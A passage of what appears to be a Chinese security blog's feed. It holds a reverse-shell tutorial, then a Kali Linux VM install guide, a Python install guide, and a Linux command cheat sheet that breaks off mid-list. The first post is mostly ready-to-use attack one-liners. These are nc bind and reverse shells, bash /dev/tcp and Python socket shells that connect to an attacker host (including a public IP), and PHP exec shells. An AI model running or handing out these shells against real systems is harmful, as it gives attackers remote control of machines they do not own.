      <url>/2024/12/15/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><font style="color:rgb(0, 0, 0);">假如ubuntu、CentOS为目标服务器系统</font></p><p><font style="color:rgb(0, 0, 0);">kali为攻击者的系统，ip为：192.168.0.4，开放4444端口且没被占用</font></p><p><font style="color:rgb(0, 0, 0);">最终是将ubuntu、CentOS的shell反弹到kali上</font></p><h2 id="正向反弹shell"><a href="#正向反弹shell" class="headerlink" title="正向反弹shell"></a><font style="color:rgb(3, 120, 187);">正向反弹shell</font></h2><p><font style="color:rgb(0, 0, 0);">ubuntu或者CentOS上面输入</font></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(245, 245, 245);">nc -lvp 7777 -e &#x2F;bin&#x2F;bash</font></p><p><font style="color:rgb(0, 0, 0);">kali上输入</font></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(245, 245, 245);">nc ip 7777</font></p><p><font style="color:rgb(0, 0, 0);">正向反弹是目标机先执行nc命令，然后kali上再进行nc监听，即可反弹shell。</font></p><p><font style="color:rgb(0, 0, 0);">需要目标机安装nc。</font></p><h2 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a><font style="color:rgb(3, 120, 187);">反向反弹shell</font></h2><h3 id="方法1：bash反弹"><a href="#方法1：bash反弹" class="headerlink" title="方法1：bash反弹"></a><font style="color:rgb(3, 120, 187);">方法1：bash反弹</font></h3><p><font style="color:rgb(0, 0, 0);background-color:rgb(245, 245, 245);">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;122.228.26.226&#x2F;27317 0&gt;&amp;1</font></p><p><font style="color:rgb(0, 0, 0);">但首先需要在kali上使用nc监听端口：</font></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(245, 245, 245);">nc -lvp 7777</font></p><p><font style="color:rgb(0, 0, 0);">此方法在ubuntu下不会反弹成功，CentOS可以反弹成功。</font></p><h3 id="方法2：python反弹"><a href="#方法2：python反弹" class="headerlink" title="方法2：python反弹"></a><font style="color:rgb(3, 120, 187);">方法2：python反弹</font></h3><p><font style="color:rgb(0, 0, 0);">反弹shell的命令如下：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);background-color:rgb(245, 245, 245);"></font></p><p><font style="color:rgb(0, 0, 0);">首先，使用nc在kali上监听端口：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">在CentOS或者ubuntu下使用python去反向连接，输入：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.0.4&#x27;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">此方法ubuntu和Linux均反弹成功。</font></p><h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a><font style="color:rgb(3, 120, 187);">方法3</font></h3><p><font style="color:rgb(0, 0, 0);">首先在kali上输入nc监听：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">在CentOS或者ubuntu 上使用nc去反向连接，命令如下：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 122.228.26.226 27317</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211170701355.png" alt="image-20241211170701249">在kali机打开4444监听端口<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211170704075.png" alt="image-20241211170703770">内网穿透出去，拿到公网ip端口<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211170707068.png" alt="image-20241211170706956">攻击机输入反向连接<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211170710167.png" alt="image-20241211170709825">然后看我们的kali机，可以看到我们已经连接成功</p><h3 id="方法4：php反弹shell"><a href="#方法4：php反弹shell" class="headerlink" title="方法4：php反弹shell"></a><font style="color:rgb(3, 120, 187);">方法4：php反弹shell</font></h3><p><font style="color:rgb(0, 0, 0);">首先在kali上输入：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">然后在目标机上输入：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php- &#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777&quot;)&#x27;</span><br><span class="line">或</span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.0.4&quot;,7777);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数。</font></p><p><font style="color:rgb(0, 0, 0);">遇到反弹后不是正常的shell，可用命令：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">转化为常规的shell。</font></p>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透神器Kali Linux系统的安装教程</title>
      <link href="/2024/12/15/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8Kali_Linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2024/12/15/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8Kali_Linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透神器Kali-Linux系统的安装教程"><a href="#渗透神器Kali-Linux系统的安装教程" class="headerlink" title="渗透神器Kali Linux系统的安装教程"></a>渗透神器Kali Linux系统的安装教程</h1><p><strong>镜像下载</strong></p><p><strong>镜像链接：【操作系统】Kali Linux v2023.4 官方版 - 极核GetShell (get-shell.com)</strong></p><p><strong>其他镜像链接：（按需下载）：</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161438790.png" alt="image-20241211161430722"></p><p><strong>在这里我选择的清华源，点击直链下载后面的链接进行下载。需要其他镜像文件的可以前往官网地址或者其他源镜站进行下载。</strong></p><p><strong>安装kali</strong></p><p><strong>1.打开Vmware首页，创建新的虚拟机。（Vmware直接去官网下载即可）</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161451971.png" alt="image-20241211161451633"></p><p><strong>2.在这里，我们选择简单一点的安装方式-典型安装</strong></p><hr><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161500868.png" alt="image-20241211161500747"></p><hr><p><strong>3.选择 稍后安装操作系统</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161507197.png" alt="image-20241211161507055"></p><p><strong>4.选择Linux，选本随意，这里我选的是“debian”</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161513303.png" alt="image-20241211161513051"></p><p><strong>5.给自己的虚拟机起个名字（如kali2），后面可以自己更改，更改安装路径，点击浏览自行选择文件夹。</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161518637.png" alt="image-20241211161518498"></p><hr><hr><p><strong>6.虚拟机的大小，根据你自己的硬盘容量来选择，选择第一个“将虚拟磁盘存储为单个文件”（我一般选择20G就够了）</strong></p><hr><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161523875.png" alt="image-20241211161523735"></p><hr><p><strong>7.完成创建，点击完成。</strong></p><hr><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161528735.png" alt="image-20241211161528550"></p><hr><p><strong>8.对虚拟机进行编辑，点击“编辑虚拟机设置”</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161533370.png" alt="image-20241211161533215"></p><hr><hr><p><strong>9.根据自己的需求来分配内存大小（一般2G就够了）</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161538390.png" alt="image-20241211161538202"></p><p><strong>10.分配处理器（处理器一般我是选择4个）</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161543597.png" alt="image-20241211161543335"><strong>处理器这边可以分4个给她，这样不会太卡</strong></p><p><strong>11.设置映像文件（导入我们刚刚下载好的镜像文件）</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161548787.png" alt="image-20241211161548569"></p><p><strong>12.网络适配器</strong></p><p><strong>选择NAT模式</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161554180.png" alt="image-20241211161553938"></p><p><strong>到这里，前置配置完成。其他默认即可。如果有不需要的，如“打印机”，可以选中后自行移除。</strong></p><p><strong>13.开启此虚拟机</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161559346.png" alt="image-20241211161559102"></p><p><strong>14</strong>.选择Graphical install进行安装****</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161604011.png" alt="image-20241211161603678"></p><p><strong>到这里，我们需要点击一下屏幕，然后使用 Enter键进行确认</strong></p><p><strong>当我们需要返回到物理机桌面时候，我们需要按下Ctrl + ALt</strong></p><p><strong>15.选择中文安装。</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161609279.png" alt="image-20241211161609115"></p><p><strong>16.地区选择</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161614340.png" alt="image-20241211161614162"></p><p><strong>17.键盘映射。</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161620029.png" alt="image-20241211161619764"></p><p><strong>18.点击继续，然后我们需要稍等一会</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161624967.png" alt="image-20241211161624774"></p><p><strong>19.主机名配置，我们可以随便取个名字，也可以默认 kali</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/27497895/1726819927079-7541aab7-446a-454a-931f-b2b2dc8f39ca.png"></p><hr><hr><p><strong>20.域名配置，这里我们可以不用填写，直接点击继续就好。</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161641746.png" alt="image-20241211161641498"></p><p><strong>21.用户名设置（我一般是设置成kali-kali，好记而且不会错）</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161648702.png" alt="image-20241211161648507"></p><hr><hr><p><strong>22.设置密码</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/27497895/1726820000729-31be3483-7799-40b3-8d12-dedd8d63b5a7.png"></p><p><strong>点击继续，然后我们需要稍等一会。</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161701038.png" alt="image-20241211161700872"></p><p><strong>23.接下来就是磁盘配置，比较重要，容易出错，这里牛牛建议大家使用“向导-使用整个磁盘”</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161705573.png" alt="image-20241211161705416"><strong>这边这个就选默认的使用整个磁盘就可以了，一般kali机也只需要一个</strong></p><p><strong>24.点击继续，默认选择</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161710243.png" alt="image-20241211161710088"></p><p><strong>25.使用第一个分区方案</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161714044.png" alt="image-20241211161713887"></p><p><strong>26.完成分区操作</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161719720.png" alt="image-20241211161719557"></p><hr><hr><p><strong>27.完成并写入磁盘</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161723954.png" alt="image-20241211161723783"><strong>这边选择是，你选择否他也不会给你跑的（嘻嘻)</strong></p><p><strong>28.在这个界面会停留时间较长，我们需要慢慢等待一下</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161728570.png" alt="image-20241211161728429"></p><p><strong>29.在这里，选择需要安装的程序，默认即可。也可以全部勾选，但是第二个一定要勾选。</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161733478.png"></p><p><strong>时间大概是20分钟左右，时间比较长，耐心等待~可以看看我前面写的文章关于命令的，在kali中需要学会很多linux的命令执行的</strong></p><p><strong>30.选择“是”</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161737760.png" alt="image-20241211161737607"></p><p><strong>31.选择”&#x2F;dev&#x2F;sda”</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161742149.png" alt="image-20241211161741989"></p><p><strong>32.安装完成，点击继续</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161746403.png" alt="image-20241211161746186"></p><p><strong>33.登录账户</strong></p><p><strong>我刚刚设置的是kali和kali</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161751908.png" alt="image-20241211161751488"></p><p><strong>34.创建root账户（因为kali这个用户不能直接管理员权限）</strong></p><p><strong>sudo passwd root</strong></p><p><strong>切换到root账户</strong></p><p><strong>su root</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211161756407.png" alt="image-20241211161756142"></p><p><strong>到这里，我们的渗透神器kali已经安装完成了！kali还有许多工具，但是想要掌握kali必须要掌握基础的linux命令，大家加油~</strong></p><p>教程如果有不清晰或不明白的地方，欢迎大家评论区留言讨论。</p><p>如果有什么不对或者需要改正的地方，请多多指教！欢迎讨论交流！</p><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux安装Python环境保姆级教程</title>
      <link href="/2024/12/15/linux%E5%AE%89%E8%A3%85Python%E7%8E%AF%E5%A2%83%E6%95%99%E7%A8%8B/"/>
      <url>/2024/12/15/linux%E5%AE%89%E8%A3%85Python%E7%8E%AF%E5%A2%83%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="linux怎么安装Python环境"><a href="#linux怎么安装Python环境" class="headerlink" title="linux怎么安装Python环境"></a>linux怎么安装Python环境</h2><hr><p>在Linux上安装特定版本的Python（如Python 3.9.6）通常涉及从源代码编译安装或使用第三方仓库（如Deadsnakes PPA对于Ubuntu&#x2F;Debian系统）。以下是在Linux上安装Python 3.9.6的几种方法：</p><p>方法1：从源代码编译安装<br>下载Python源代码 访问Python官方网站下载页面（<a href="https://www.python.org/downloads/source/%EF%BC%89%EF%BC%8C%E6%89%BE%E5%88%B0Python">https://www.python.org/downloads/source/），找到Python</a> 3.9.6的源代码包（通常是.tar.xz格式），然后使用wget或curl命令下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.9.6/Python-3.9.6.tar.xz</span><br></pre></td></tr></table></figure><p>解压源代码包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xvf Python-3.9.6.tar.xz  </span><br><span class="line"><span class="built_in">cd</span> Python-3.9.6</span><br></pre></td></tr></table></figure><p>安装依赖 根据您的Linux发行版安装必要的编译依赖。对于Debian&#x2F;Ubuntu系统，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update  </span><br><span class="line"><span class="built_in">sudo</span> apt install -y build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev wget</span><br></pre></td></tr></table></figure><p>对于Red Hat&#x2F;CentOS系统，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum groupinstall <span class="string">&#x27;Development Tools&#x27;</span>  </span><br><span class="line"><span class="built_in">sudo</span> yum install zlib-devel ncurses-devel openssl-devel readline-devel gdbm-devel sqlite-devel bzip2-devel</span><br></pre></td></tr></table></figure><p>编译并安装Python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local  </span><br><span class="line">make -j $(<span class="built_in">nproc</span>)  </span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure><p>–prefix&#x3D;&#x2F;usr&#x2F;local 指定了Python的安装目录，您可以根据需要更改。<br>验证安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/python3.9 --version</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 --version</span><br></pre></td></tr></table></figure><p>如果您想将新安装的Python版本添加到系统路径中，以便直接通过python3.9命令访问，您可能需要修改<del>&#x2F;.bashrc或</del>&#x2F;.bash_profile文件。<br>方法2：使用Deadsnakes PPA（仅适用于Ubuntu&#x2F;Debian）<br>对于Ubuntu&#x2F;Debian系统，您可以使用Deadsnakes PPA来安装较新的Python版本。但是，请注意，PPA中的版本可能不包括所有次要版本，如3.9.6。如果可用，安装命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> add-apt-repository ppa:deadsnakes/ppa  </span><br><span class="line"><span class="built_in">sudo</span> apt update  </span><br><span class="line"><span class="built_in">sudo</span> apt install python3.9</span><br></pre></td></tr></table></figure><p>然后验证安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 --version</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211162336488.png" alt="image-20241211162336375"></p><p>方法3：使用其他包管理器（如conda）<br>如果您正在使用Anaconda或Miniconda等Python发行版，您可以使用conda包管理器来安装特定版本的Python。首先，您需要安装Anaconda或Miniconda，然后使用以下命令安装Python 3.9.6（如果可用)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n myenv python=3.9.6  </span><br><span class="line">conda activate myenv</span><br></pre></td></tr></table></figure><p>在上面的命令中，myenv是新创建的环境名称，您可以根据需要更改。之后，您可以在该环境中使用Python 3.9.6。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux常用命令大全（入门小白必看）</title>
      <link href="/2024/12/15/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8%EF%BC%88%E5%85%A5%E9%97%A8%E5%B0%8F%E7%99%BD%E5%BF%85%E7%9C%8B%EF%BC%89/"/>
      <url>/2024/12/15/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8%EF%BC%88%E5%85%A5%E9%97%A8%E5%B0%8F%E7%99%BD%E5%BF%85%E7%9C%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="开关机"><a href="#开关机" class="headerlink" title="开关机"></a><font style="color:rgb(51, 51, 51);">开关机</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">sync</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：把内存中的数据写到磁盘中（关机、重启前都需先执行sync）</font></li><li><strong><font style="color:rgb(51, 51, 51);">shutdown -r now</font></strong><font style="color:rgb(51, 51, 51);">或</font><strong><font style="color:rgb(51, 51, 51);">reboot</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：立刻重启</font></li><li><strong><font style="color:rgb(51, 51, 51);">shutdown -h now</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：立刻关机</font></li><li><strong><font style="color:rgb(51, 51, 51);">shutdown -h 20:00</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：预定时间关闭系统（晚上8点关机，如果现在超过8点，则明晚8点）</font></li><li><strong><font style="color:rgb(51, 51, 51);">shutdown -h +10</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：预定时间关闭系统（10分钟后关机）</font></li><li><strong><font style="color:rgb(51, 51, 51);">shutdown -c</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：取消按预定时间关闭系统</font></li></ul><h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a><font style="color:rgb(51, 51, 51);">系统信息</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">who am i</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看当前使用的终端</font></li><li><strong><font style="color:rgb(51, 51, 51);">who</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">或</font><font style="color:rgb(51, 51, 51);"> </font><strong><font style="color:rgb(51, 51, 51);">w</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">： 查看所有终端</font></li><li><strong><font style="color:rgb(51, 51, 51);">uname -m</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示机器的处理器架构（如x86_64）</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat &#x2F;proc&#x2F;version</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看linux版本信息</font></li><li><strong><font style="color:rgb(51, 51, 51);">uname -r</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示正在使用的内核版本</font></li><li><strong><font style="color:rgb(51, 51, 51);">lsb_release -a</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看系统发行版本（如CentOS7）（没这个命令先安装yum install -y redhat-lsb-core）（这个命令适用于所有的Linux发行版，包括Redhat、SuSE、Debian…等发行版）</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat &#x2F;etc&#x2F;redhat-release</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看系统发行版本（如CentOS7）（这种方法只适合Redhat系的Linux）</font></li><li><strong><font style="color:rgb(51, 51, 51);">rpm -qa | grep kernel-devel</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看kernel-devel版本（安装软件时编译内核用，故需要保持内核版本一致性）</font></li><li><strong><font style="color:rgb(51, 51, 51);">yum install -y “kernel-devel-uname-r &#x3D;&#x3D; $(uname -r)”</font></strong><font style="color:rgb(51, 51, 51);">：安装和Linux内核版本匹配的kernel-devel</font></li><li><strong><font style="color:rgb(51, 51, 51);">hostnamectl set-hostname 主机名</font></strong><font style="color:rgb(51, 51, 51);">：修改主机名（包括静态、瞬态和灵活主机名，如有域名解析记得手动更新&#x2F;etc&#x2F;hosts）</font></li><li><strong><font style="color:rgb(51, 51, 51);">date</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示系统日期 （date +%Y&#x2F;%m&#x2F;%d : 显示效果如2018&#x2F;01&#x2F;01）</font></li><li><strong><font style="color:rgb(51, 51, 51);">date 070314592018.00</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：设置时间（格式为月日时分年.秒 ）</font></li><li><strong><font style="color:rgb(51, 51, 51);">clock -w</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：将时间修改保存到 BIOS</font></li><li><strong><font style="color:rgb(51, 51, 51);">cal 2018</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示2018年的日历表</font></li><li><strong><font style="color:rgb(51, 51, 51);">clear</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：清空命令行</font></li><li><strong><font style="color:rgb(51, 51, 51);">ifconfig</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示或设置网卡（查ip等）（类似windows中ipconfig）</font></li><li><strong><font style="color:rgb(51, 51, 51);">ping -c 3 <a href="http://www.baidu.com/">www.baidu.com</a></font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：测试百度与本机的连接情况（ -c 3表示测试3次）</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat &#x2F;proc&#x2F;cpuinfo</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示CPU的信息</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat &#x2F;proc&#x2F;cpuinfo| grep “physical id”| sort| uniq| wc -l</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看物理CPU个数</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat &#x2F;proc&#x2F;cpuinfo| grep “cpu cores”| uniq</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看每个物理CPU的核数</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat &#x2F;proc&#x2F;cpuinfo| grep “processor”| wc -l</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看逻辑CPU个数即线程数</font></li><li><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211170537135.png" alt="image-20241211170536786"></li></ul><h2 id="系统性能"><a href="#系统性能" class="headerlink" title="系统性能"></a><font style="color:rgb(51, 51, 51);">系统性能</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">top</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：动态实时显示cpu、内存、进程等使用情况（类似windows下的任务管理器）</font></li><li><strong><font style="color:rgb(51, 51, 51);">top -d 2 -p 7427</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：-d为画面更新的秒数，默认5秒，-p为指定进程pid的信息</font></li><li><strong><font style="color:rgb(51, 51, 51);">vmstat 2 10</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：每隔2秒采集一次服务器状态，采集10次（查看内存、io读写状态、cpu）</font></li><li><strong><font style="color:rgb(51, 51, 51);">free -h</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:查看系统内存及虚拟内存使用情况</font></li><li><strong><font style="color:rgb(51, 51, 51);">df -h</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:显示磁盘的空间使用情况</font></li><li><strong><font style="color:rgb(51, 51, 51);">iostat</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：可查io读写、cpu使用情况</font></li><li><strong><font style="color:rgb(51, 51, 51);">sar -u 3 5</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:查看cpu使用情况（3秒一次，共5次）</font></li><li><strong><font style="color:rgb(51, 51, 51);">sar -d 2 3</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：评估磁盘性能</font></li><li><strong><font style="color:rgb(51, 51, 51);">ps aux|grep firefox</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：获取火狐的进程号（PID）（可查看进程占用cpu、内存百分比及进程触发指令的路径）</font></li><li><strong><font style="color:rgb(51, 51, 51);">kill -9 进程号</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：强制杀死进程</font></li><li><strong><font style="color:rgb(51, 51, 51);">systemctl</font></strong><font style="color:rgb(51, 51, 51);"> ：查看正在运行的服务</font><img 